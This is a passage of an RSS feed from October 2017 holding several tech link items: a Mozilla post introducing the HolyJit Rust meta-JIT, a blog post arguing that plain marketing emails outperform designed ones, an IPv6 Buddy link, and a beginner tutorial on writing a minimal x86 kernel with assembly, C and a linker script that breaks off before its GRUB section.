markup--p-em&quot;&gt;mastodon.technology&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;,&lt;/em&gt; &lt;a href=&quot;https://mastodon.rocks/about&quot; data-href=&quot;https://mastodon.rocks/about&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;mastodon.rocks&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p name=&quot;b7cc&quot; id=&quot;b7cc&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;Redecentralize now!&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 20 Oct 2017 11:47:13 +0000</pubDate>
<dc:creator>daveid</dc:creator>
<og:title>Mastodon 2.0 – Eugen Rochko – Medium</og:title>
<og:url>https://medium.com/@Gargron/mastodon-2-0-e93d9d28dbb9</og:url>
<og:image>https://cdn-images-1.medium.com/max/1200/1*xfxHsMRp61tbOY3VPP9ggQ.png</og:image>
<og:description>The Big Emoji Update</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://medium.com/@Gargron/mastodon-2-0-e93d9d28dbb9?</dc:identifier>
</item>
<item>
<title>HolyJit: A New Hope</title>
<link>https://blog.mozilla.org/javascript/2017/10/20/holyjit-a-new-hope/</link>
<guid isPermaLink="true" >https://blog.mozilla.org/javascript/2017/10/20/holyjit-a-new-hope/</guid>
<description>&lt;p&gt;tl;dr: We believe there is a safer and easier way of writing a Jit.&lt;/p&gt;

&lt;p&gt;Today, all browsers’ Jits share a similar design. This design makes extending the language or improving its performance time-consuming and complex, especially while avoiding security issues.&lt;/p&gt;
&lt;p&gt;For instance, at the time of this writing, our Jit relies upon ~15000 lines of carefully crafted, hand-written assembly code (~36000 in Chromium’s v8). The Jit directory represents 5% of all the C++ code of Firefox, and contains 3 of the top 20 largest files of Firefox, all written by hand.&lt;/p&gt;
&lt;p&gt;Interestingly, these files all contain code that is derived by hand from the Interpreter and a limited set of built-in functions of the JavaScript engine. But why do it by hand, when we could automatize the process, saving time and risk? HolyJit is exploring this possibility.&lt;/p&gt;

&lt;p&gt;This week, during the JS Team meetup, we have demonstrated the first prototype of a Rust meta-Jit compiler, named HolyJit. If our experiment proves successful, we believe that employing a strategy based on HolyJit will let us avoid many potential bugs and let us concentrate on strategic issues. This means more time to implement JavaScript features quickly and further improve the speed of our Jit.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter&quot; src=&quot;http://nbp.github.io/slides/HolyJit/JitTeamIntro/pictures/hj-overview.svg&quot; alt=&quot;HolyJit library instrumenting the Rust compiler to add a meta-Jit for Rust code.&quot;/&gt;&lt;/p&gt;
&lt;p&gt;For instance, in &lt;a href=&quot;https://hg.mozilla.org/mozilla-central/rev/8b1881ead0b6&quot;&gt;a recent change&lt;/a&gt;, we extended the support of optimizations to Array.prototype.push. What should have been a trivial modification required diving into safety-critical code and adding 135 lines of code, and reading even more code to check that we were not accidentally breaking invariants.&lt;/p&gt;
&lt;p&gt;With HolyJit, what should have been a trivial change would effectively have been a trivial change. The following change to a hypothetical JS Jit built with HolyJit does exactly the same thing as &lt;a href=&quot;https://hg.mozilla.org/mozilla-central/rev/8b1881ead0b6&quot;&gt;the previous patch&lt;/a&gt;, i.e. allowing the Jit to inline the Array.prototype.push function when it is being called with more than one argument.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;
 fn array_push(args: &amp;amp;CallArgs) -&amp;gt; Result&amp;lt;JSValue, Error&amp;gt; {
&lt;/pre&gt;
&lt;pre&gt;
-    jit_inline_if!(args.len() == 1);
&lt;/pre&gt;
&lt;pre&gt;
+    jit_inline_if!(args.len() &amp;gt;= 1);
&lt;/pre&gt;
&lt;pre&gt;
     …
 }
&lt;/pre&gt;&lt;/blockquote&gt;
&lt;p&gt;By making changes self-contained and simple, we hope that HolyJit will improve the safety of our Jit engine, and let us focus on optimizations.&lt;/p&gt;
&lt;p&gt;HolyJit Repository: &lt;a href=&quot;https://github.com/nbp/holyjit&quot;&gt;https://github.com/nbp/holyjit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Thanks to David Teller, Jason Orendorff, Sean Stangl, Jon Coppeard for proof reading this blog post.&lt;/p&gt;
</description>
<pubDate>Fri, 20 Oct 2017 11:33:28 +0000</pubDate>
<dc:creator>bpierre</dc:creator>
<og:title>HolyJit: A New Hope</og:title>
<og:url>https://blog.mozilla.org/javascript/2017/10/20/holyjit-a-new-hope/</og:url>
<og:description>tl;dr: We believe there is a safer and easier way of writing a Jit. Current State Today, all browsers’ Jits share a similar design. This ...</og:description>
<og:image>https://blog.mozilla.org/javascript/wp-content/themes/OneMozilla/img/mozilla-wordmark.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.mozilla.org/javascript/2017/10/20/holyjit-a-new-hope/</dc:identifier>
</item>
<item>
<title>Plain emails not only save time but work better (2016)</title>
<link>https://www.gkogan.co/blog/dont-design-emails/</link>
<guid isPermaLink="true" >https://www.gkogan.co/blog/dont-design-emails/</guid>
<description>&lt;p&gt;I used to dread setting up email automation and email campaigns.&lt;/p&gt;
&lt;p&gt;Why? Because before a single sales or marketing email could be sent, it needed a &lt;em&gt;design&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;In my attempt to sidestep this time-consuming process, &lt;strong&gt;I learned that plain emails not only save time but work better.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Why Design is a Barrier to Emails&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://d33wubrfki0l68.cloudfront.net/354ec96492595bb0289b17689688956308ccd4bf/34980/images/uploads/0387.jpg&quot; alt=&quot;Cave people puzzled by design&quot;/&gt;&lt;/p&gt;
&lt;p&gt;If you ever had to go through the hair-pulling process of designing emails, then you understand. If you haven’t, here’s why it’s such pain:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;Email tools/clients are inconsistent in how they render HTML and CSS.&lt;/strong&gt; A designed email might look great in Gmail, broken in Outlook, and unreadable in Apple Mail.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Half of all emails are opened on mobile devices&lt;/strong&gt; (according to &lt;a href=&quot;https://litmus.com/blog/53-of-emails-opened-on-mobile-outlook-opens-decrease-33&quot;&gt;one study&lt;/a&gt;). Email looks good in different clients? Great, now make it work on a 4&quot; screen just as well as on a desktop.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Email require their own flavor of HTML and CSS.&lt;/strong&gt; Want to have rows or columns in your layout? You'll have to use &lt;code&gt;&amp;lt;table&amp;gt;&lt;/code&gt; tags—a method long buried by web developers. There's also no support for external stylesheets, element position styling, and so on...&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;There are email templates available, but they don't eliminate design work.&lt;/strong&gt; Those templates must still be edited to match company branding and the use case.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The &lt;em&gt;design&lt;/em&gt; is one more thing that needs to be approved&lt;/strong&gt;, thereby adding a delay. Worse, &lt;a href=&quot;https://en.wikipedia.org/wiki/Law_of_triviality&quot;&gt;it's a chance for everyone to chime in&lt;/a&gt; about their preferred color and font size.&lt;/li&gt;
&lt;/ol&gt;&lt;h2&gt;What If...&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://d33wubrfki0l68.cloudfront.net/7ec94c041bf39990f0b37e5e95df0baa0b2af29a/54272/images/uploads/0187.jpg&quot; alt=&quot;Cave people using minimal design&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Having gone through this multiple times with multiple clients, I began wondering whether this is even necessary.&lt;/p&gt;
&lt;p&gt;What if the email was… plain?&lt;/p&gt;
&lt;p&gt;I didn’t think it was such a bad idea. Here’s why:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Professionals (ie, corporate buyers) care more about substance and valuable information than pretty designs. This is especially true for technical audiences such as engineers.&lt;/li&gt;
&lt;li&gt;People get dozens of pretty newsletters per day. Each one may look nice, but collectively they look the same and face the same fate: ignored, deleted, or flagged as spam. Perhaps a plain email would stand out.&lt;/li&gt;
&lt;li&gt;I've learned that &lt;a href=&quot;https://www.gkogan.co/blog/ugly-ad-saved-business/&quot;&gt;&quot;ugly&quot; could be effective&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;More importantly, using a plain email would save lots of time and effort. As a goal-driven-lazy person, that’s a good enough reason to start experimenting.&lt;/p&gt;
&lt;h2&gt;Testing Plain vs Designed Emails&lt;/h2&gt;
&lt;p&gt;As one example, I tested two versions of a newsletter that went out to 24,000+ recipients:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://d33wubrfki0l68.cloudfront.net/afbbd31d4c768cedbe3c5e619330439e40d11460/b2444/images/uploads/designed-vs-plain-emails.jpg&quot; alt=&quot;designed-vs-plain-emails&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Half of the recipients received the version on the left. It uses a basic template from &lt;a href=&quot;http://mailchimp.com&quot;&gt;Mailchimp,&lt;/a&gt; and looks like a standard marketing newsletter.&lt;/p&gt;
&lt;p&gt;The other half received the version on the right. It has no styling whatsoever.&lt;/p&gt;
&lt;p&gt;Which version do you think received more opens and clicks?&lt;/p&gt;
&lt;h2&gt;The Result&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;The plain email—which took &lt;em&gt;no&lt;/em&gt; time to design or code—was opened by more recipients and had 3.3x more clicks than the designed email.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://d33wubrfki0l68.cloudfront.net/83b1bbb693081be90fad1bee9dc7f4527ccbadf2/6fe4e/images/uploads/email-test-results.jpg&quot; alt=&quot;email-test-results&quot;/&gt;&lt;/p&gt;
&lt;p&gt;This is just one example. I’ve performed similar tests for all kinds of emails:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;User onboarding emails&lt;/li&gt;
&lt;li&gt;Cold sales emails&lt;/li&gt;
&lt;li&gt;Webinar invitations&lt;/li&gt;
&lt;li&gt;Newsletters&lt;/li&gt;
&lt;li&gt;Product updates&lt;/li&gt;
&lt;li&gt;And so on...&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;The plain, unstyled emails resulted in more opens, clicks, replies, and conversions, &lt;em&gt;every time&lt;/em&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Replies to &lt;a href=&quot;https://www.gkogan.co/blog/question-for-saas-trial-users/&quot;&gt;welcome emails&lt;/a&gt; were tripled. Cold emails were getting 30-35% open rates and 3% conversion rates, which is incredible.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sending emails went from an occasional chore to a major source of new leads and customers.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Why Plain Emails Work (Better)&lt;/h2&gt;
&lt;p&gt;Why are the plain emails crushing the performance of designed emails?&lt;/p&gt;
&lt;p&gt;Here’s what I suspect:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;They're less likely to be caught in spam filters.&lt;/strong&gt; Having less HTML and fewer non-text elements such as images lowers the likelihood of triggering spam filters. You can use a &lt;a href=&quot;https://www.mail-tester.com/&quot;&gt;free spam checker&lt;/a&gt; to validate this by testing plain and designed emails.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;They're less likely to go into the &quot;Promotions&quot; tab in Gmail&lt;/strong&gt; (used by ~16% of all email users), for the same reasons above. From my testing, the plain emails typically end up in the Updates tab and some times even in the primary tab. Of course, the text in the email also affects this.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;They don't &lt;em&gt;look&lt;/em&gt; like advertisements.&lt;/strong&gt; The second the recipient interprets your email as an ad, promotion, or sales pitch—and it does take just a second—its chances of being read or acted upon plummet towards zero. A plain email leads people to start reading it before jumping to conclusions.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;They feel more personal.&lt;/strong&gt; It's no &lt;a href=&quot;https://www.groovehq.com/support/scripts-for-handwritten-notes&quot;&gt;handwritten note&lt;/a&gt;, but it's much more personal than an over-designed email with the recipient's first name crammed somewhere inside.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Now I look forward to setting up email campaigns because I know I can focus on the content, waste no time on design, and still get great results.&lt;/p&gt;
&lt;h2&gt;Try It Yourself&lt;/h2&gt;
&lt;p&gt;If you’re already running email campaigns, then A/B test plain versions of your emails. Most email service providers, such as Mailchimp, Constant Contact, Hubspot, and Marketo, have built-in A/B testing functionality.&lt;/p&gt;
&lt;p&gt;If you’re not already using email for to get leads or customers leads, then:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;You're leaving &lt;em&gt;a lot&lt;/em&gt; of revenue on the table. &lt;a href=&quot;https://www.gkogan.co/&quot;&gt;Contact me for help.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Your barrier to setting up email marketing just got lower. Now you know there's no need to worry about meticulously designing or coding emails before sending them out.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;Marketing emails don’t need to be pretty to be effective.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Stop over-designing them, or don’t design them at all. &lt;a href=&quot;https://www.gkogan.co/blog/increase-reply-rates/&quot;&gt;And keep them short.&lt;/a&gt; You’ll save yourself time, money, and frustration.&lt;/p&gt;
&lt;p&gt;They’ll work better, too.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=15514855&quot; target=&quot;_blank&quot;&gt;Discuss on Hacker News →&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;◼&lt;/p&gt;
&lt;p&gt;PS - Liked this article? I write one every month or so, covering lessons learned on B2B startup growth. Get an email update when the next one is published:&lt;/p&gt;

</description>
<pubDate>Fri, 20 Oct 2017 11:13:37 +0000</pubDate>
<dc:creator>gk1</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.gkogan.co/blog/dont-design-emails/</dc:identifier>
</item>
<item>
<title>IPv6 Buddy</title>
<link>http://www.ipv6buddy.com/</link>
<guid isPermaLink="true" >http://www.ipv6buddy.com/</guid>
<description>[unable to retrieve full-text content]&lt;p&gt;Article URL: &lt;a href=&quot;http://www.ipv6buddy.com/&quot;&gt;http://www.ipv6buddy.com/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=15514674&quot;&gt;https://news.ycombinator.com/item?id=15514674&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Points: 260&lt;/p&gt;&lt;p&gt;# Comments: 79&lt;/p&gt;</description>
<pubDate>Fri, 20 Oct 2017 10:10:25 +0000</pubDate>
<dc:creator>vermilingua</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.ipv6buddy.com/</dc:identifier>
</item>
<item>
<title>Let’s write a simple Kernel (2014)</title>
<link>http://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel</link>
<guid isPermaLink="true" >http://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel</guid>
<description>&lt;p&gt;Hello World,&lt;/p&gt;
&lt;p&gt;Let us write a simple kernel which could be loaded with the GRUB bootloader on an x86 system. This kernel will display a message on the screen and then hang.&lt;/p&gt;
&lt;img src=&quot;http://static.tumblr.com/gltvynn/MDYn443cj/one-does-not-kernel.jpg&quot; alt=&quot;One does simply write a kernel&quot; width=&quot;75%&quot;/&gt;
&lt;p&gt;&lt;strong&gt;How does an x86 machine boot&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Before we think about writing a kernel, let’s see how the machine boots up and transfers control to the kernel:&lt;/p&gt;
&lt;p&gt;Most registers of the x86 CPU have well defined values after power-on. The Instruction Pointer (EIP) register holds the memory address for the instruction being executed by the processor. EIP is hardcoded to the value &lt;strong&gt;0xFFFFFFF0&lt;/strong&gt;. Thus, the x86 CPU is hardwired to begin execution at the physical address 0xFFFFFFF0. It is in fact, the last 16 bytes of the 32-bit address space. This memory address is called reset vector.&lt;/p&gt;
&lt;p&gt;Now, the chipset’s memory map makes sure that 0xFFFFFFF0 is mapped to a certain part of the BIOS, not to the RAM. Meanwhile, the BIOS copies itself to the RAM for faster access. This is called &lt;strong&gt;shadowing&lt;/strong&gt;. The address 0xFFFFFFF0 will contain just a jump instruction to the address in memory where BIOS has copied itself.&lt;/p&gt;
&lt;p&gt;Thus, the BIOS code starts its execution.  BIOS first searches for a bootable device in the configured boot device order. It checks for a certain magic number to determine if the device is bootable or not. (whether bytes 511 and 512 of first sector are &lt;strong&gt;0xAA55&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;Once the BIOS has found a bootable device, it copies the contents of the device’s first sector into RAM starting from physical address &lt;strong&gt;0x7c00&lt;/strong&gt;; and then jumps into the address and executes the code just loaded. This code is called the &lt;strong&gt;bootloader&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The bootloader then loads the kernel at the physical address &lt;strong&gt;0x100000&lt;/strong&gt;. The address 0x100000 is used as the start-address for all big kernels on x86 machines.&lt;/p&gt;
&lt;p&gt;All x86 processors begin in a simplistic 16-bit mode called &lt;strong&gt;real mode&lt;/strong&gt;. The GRUB bootloader makes the switch to 32-bit &lt;strong&gt;protected mode&lt;/strong&gt; by setting the lowest bit of &lt;code&gt;CR0&lt;/code&gt; register to &lt;strong&gt;1&lt;/strong&gt;. Thus the kernel loads in 32-bit protected mode.&lt;/p&gt;
&lt;p&gt;Do note that in case of linux kernel, GRUB detects linux boot protocol and loads linux kernel in real mode. Linux kernel itself &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fblob%2Fmaster%2Farch%2Fx86%2Fboot%2Fmain.c%23L181&amp;amp;t=MDA2YjZlNzUyOTlmYzNjOTEyYmE4ZTVjNzU0Y2FhZjQzNTlkOWFiYSxJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//github.com/torvalds/linux/blob/master/arch/x86/boot/main.c#L181&quot; target=&quot;_blank&quot;&gt;makes the switch&lt;/a&gt; to protected mode.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What all do we need?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;* An x86 computer (of course)&lt;br/&gt;* Linux&lt;br/&gt;* &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Fwww.nasm.us%2F&amp;amp;t=Y2E2OGRhMGZkYTc5OTBhZDM4MjU2ODU0NjdiODg0ZThkMTk2N2U3ZCxJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//www.nasm.us/&quot; target=&quot;_blank&quot;&gt;NASM assembler&lt;/a&gt;&lt;br/&gt;* gcc&lt;br/&gt;* ld (GNU Linker)&lt;br/&gt;* grub&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Source Code&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Source code is available at my &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Fgithub.com%2Farjun024%2Fmkernel&amp;amp;t=MGJmMmY4Y2U0YWE0NGY1YmMzYjFjYmJkNTQwNTg4ODU2NzEyY2RhZSxJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//github.com/arjun024/mkernel&quot; target=&quot;_blank&quot;&gt;Github repository - mkernel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The entry point using assembly&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We like to write everything in C, but we cannot avoid a little bit of assembly. We will write a small file in x86 assembly-language that serves as the starting point for our kernel. All our assembly file will do is invoke an external function which we will write in C, and then halt the program flow.&lt;/p&gt;
&lt;p&gt;How do we make sure that this assembly code will serve as the starting point of the kernel?&lt;/p&gt;
&lt;p class=&quot;indent5&quot;&gt;We will use a linker script that links the object files to produce the final kernel executable. (more explained later)  In this linker script, we will explicitly specify that we want our binary to be loaded at the address 0x100000. This address, as I have said earlier, is where the kernel is expected to be. Thus, the bootloader will take care of firing the kernel’s entry point.&lt;/p&gt;
&lt;p&gt;Here’s the assembly code:&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-asm&quot;&gt;
;;kernel.asm
bits 32                 ;nasm directive - 32 bit
section .text

global start
extern kmain            ;kmain is defined in the c file

start:
  cli                   ;block interrupts
  mov esp, stack_space  ;set stack pointer
  call kmain
  hlt                   ;halt the CPU

section .bss
resb 8192               ;8KB for stack
stack_space:
&lt;/pre&gt;
&lt;p&gt;The first instruction &lt;code&gt;bits 32&lt;/code&gt; is not an x86 assembly instruction. It’s a directive to the NASM assembler that specifies it should generate code to run on a processor operating in 32 bit mode. It is not mandatorily required in our example, however is included here as it’s good practice to be explicit.&lt;/p&gt;
&lt;p&gt;The second line begins the text section (aka code section). This is where we put all our code.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;global&lt;/code&gt; is another NASM directive to set symbols from source code as global. By doing so, the linker knows where the symbol &lt;code&gt;start&lt;/code&gt; is; which happens to be our entry point.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;kmain&lt;/code&gt; is our function that will be defined in our &lt;code&gt;kernel.c&lt;/code&gt; file. &lt;code&gt;extern&lt;/code&gt; declares that the function is declared elsewhere.&lt;/p&gt;
&lt;p&gt;Then, we have the &lt;code&gt;start&lt;/code&gt; function, which calls the &lt;code&gt;kmain&lt;/code&gt; function and halts the CPU using the &lt;code&gt;hlt&lt;/code&gt; instruction. Interrupts can awake the CPU from an &lt;code&gt;hlt&lt;/code&gt; instruction. So we disable interrupts beforehand using &lt;code&gt;cli&lt;/code&gt; instruction. &lt;code&gt;cli&lt;/code&gt; is short for clear-interrupts.&lt;/p&gt;
&lt;p&gt;We should ideally set aside some memory for the stack and point the stack pointer (&lt;code&gt;esp&lt;/code&gt;) to it. However, it seems like GRUB does this for us and the stack pointer is already set at this point. But, just to be sure, we will allocate some space in the BSS section and point the stack pointer to the beginning of the allocated memory. We use the &lt;code&gt;resb&lt;/code&gt; instruction which reserves memory given in bytes. After it, a label is left which will point to the edge of the reserved piece of memory. Just before the &lt;code&gt;kmain&lt;/code&gt; is called, the stack pointer (&lt;code&gt;esp&lt;/code&gt;) is made to point to this space using the &lt;code&gt;mov&lt;/code&gt; instruction.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The kernel in C&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In &lt;code&gt;kernel.asm&lt;/code&gt;, we made a call to the function &lt;code&gt;kmain()&lt;/code&gt;. So our C code will start executing at &lt;code&gt;kmain()&lt;/code&gt;:&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-c&quot;&gt;
/*
*  kernel.c
*/
void kmain(void)
{
        const char *str = &quot;my first kernel&quot;;
        char *vidptr = (char*)0xb8000;  //video mem begins here.
        unsigned int i = 0;
        unsigned int j = 0;

        /* this loops clears the screen
        * there are 25 lines each of 80 columns; each element takes 2 bytes */
        while(j &amp;lt; 80 * 25 * 2) {
                /* blank character */
                vidptr[j] = ' ';
                /* attribute-byte - light grey on black screen */
                vidptr[j+1] = 0x07;             
                j = j + 2;
        }

        j = 0;

        /* this loop writes the string to video memory */
        while(str[j] != '\0') {
                /* the character's ascii */
                vidptr[i] = str[j];
                /* attribute-byte: give character black bg and light grey fg */
                vidptr[i+1] = 0x07;
                ++j;
                i = i + 2;
        }
        return;
}
&lt;/pre&gt;
&lt;p&gt;All our kernel will do is clear the screen and write to it the string “my first kernel”.&lt;/p&gt;
&lt;p&gt;First we make a pointer &lt;code&gt;vidptr&lt;/code&gt; that points to the address &lt;strong&gt;0xb8000&lt;/strong&gt;. This address is the start of video memory in protected mode. The screen’s text memory is simply a chunk of memory in our address space. The memory mapped input/output for the screen starts at 0xb8000 and supports 25 lines, each line contain 80 ascii characters.&lt;/p&gt;
&lt;p&gt;Each character element in this text memory is represented by 16 bits (2 bytes), rather than 8 bits (1 byte) which we are used to.  The first byte should have the representation of the character as in ASCII. The second byte is the &lt;code&gt;attribute-byte&lt;/code&gt;. This describes the formatting of the character including attributes such as color.&lt;/p&gt;
&lt;p&gt;To print the character &lt;code&gt;s&lt;/code&gt; in green color on black background, we will store the character &lt;code&gt;s&lt;/code&gt; in the first byte of the video memory address and the value 0x02 in the second byte.&lt;br/&gt;&lt;code&gt;0&lt;/code&gt; represents black background and &lt;code&gt;2&lt;/code&gt; represents green foreground.&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;Have a look at table below for different colors:&lt;/p&gt;
&lt;pre&gt;
0 - Black, 1 - Blue, 2 - Green, 3 - Cyan, 4 - Red, 5 - Magenta, 6 - Brown, 7 - Light Grey, 8 - Dark Grey, 9 - Light Blue, 10/a - Light Green, 11/b - Light Cyan, 12/c - Light Red, 13/d - Light Magenta, 14/e - Light Brown, 15/f – White.
&lt;/pre&gt;

&lt;p&gt;In our kernel, we will use light grey character on a black background. So our attribute-byte must have the value 0x07.&lt;/p&gt;
&lt;p&gt;In the first while loop, the program writes the blank character with 0x07 attribute all over the 80 columns of the 25 lines. This thus clears the screen.&lt;/p&gt;
&lt;p&gt;In the second while loop, characters of the null terminated string “my first kernel” are written to the chunk of video memory with each character holding an attribute-byte of 0x07.&lt;/p&gt;
&lt;p&gt;This should display the string on the screen.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The linking part&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We will assemble &lt;code&gt;kernel.asm&lt;/code&gt; with NASM to an object file; and then using GCC we will compile &lt;code&gt;kernel.c&lt;/code&gt; to another object file. Now, our job is to get these objects linked to an executable bootable kernel.&lt;/p&gt;&lt;p&gt;For that, we use an explicit linker script, which can be passed as an argument to &lt;code&gt;ld&lt;/code&gt; (our linker).&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-ld&quot;&gt;
/*
*  link.ld
*/
OUTPUT_FORMAT(elf32-i386)
ENTRY(start)
SECTIONS
 {
   . = 0x100000;
   .text : { *(.text) }
   .data : { *(.data) }
   .bss  : { *(.bss)  }
 }
&lt;/pre&gt;
&lt;p&gt;First, we set the &lt;strong&gt;output format&lt;/strong&gt; of our output executable to be 32 bit &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Felinux.org%2FExecutable_and_Linkable_Format_%28ELF%29&amp;amp;t=MjhkN2Y5MjdlMGIxZTI0MGMyZWIyYTFlNTk5ZTRiZjU0ZTQ0OWNlMixJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//elinux.org/Executable_and_Linkable_Format_(ELF)&quot; target=&quot;_blank&quot;&gt;Executable and Linkable Format&lt;/a&gt; (ELF). ELF is the standard binary file format for Unix-like systems on x86 architecture.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ENTRY&lt;/strong&gt; takes one argument. It specifies the symbol name that should be the entry point of our executable.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SECTIONS&lt;/strong&gt; is the most important part for us. Here, we define the layout of our executable. We could specify how the different sections are to be merged and at what location each of these is to be placed.&lt;/p&gt;
&lt;p&gt;Within the braces that follow the SECTIONS statement, the period character (.) represents the &lt;strong&gt;location counter&lt;/strong&gt;.&lt;br/&gt;The location counter is always initialized to 0x0 at beginning of the SECTIONS block. It can be modified by assigning a new value to it.&lt;/p&gt;
&lt;p&gt;Remember, earlier I told you that kernel’s code should start at the address 0x100000. So, we set the location counter to 0x100000.&lt;/p&gt;
&lt;p&gt;Have look at the next line &lt;strong&gt;.text : { *(.text) }&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The asterisk (*) is a wildcard character that matches any file name. The expression &lt;code&gt;*(.text)&lt;/code&gt; thus means all &lt;code&gt;.text&lt;/code&gt; input sections from all input files.&lt;/p&gt;&lt;p&gt;So, the linker merges all text sections of the object files to the executable’s text section, at the address stored in the location counter. Thus, the code section of our executable begins at 0x100000.&lt;/p&gt;
&lt;p&gt;After the linker places the text output section, the value of the location counter will become&lt;br/&gt;0x1000000 + the size of the text output section.&lt;/p&gt;
&lt;p&gt;Similarly, the data and bss sections are merged and placed at the then values of location-counter.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Grub and Multiboot&lt;/strong&gt;&lt;/p&gt;
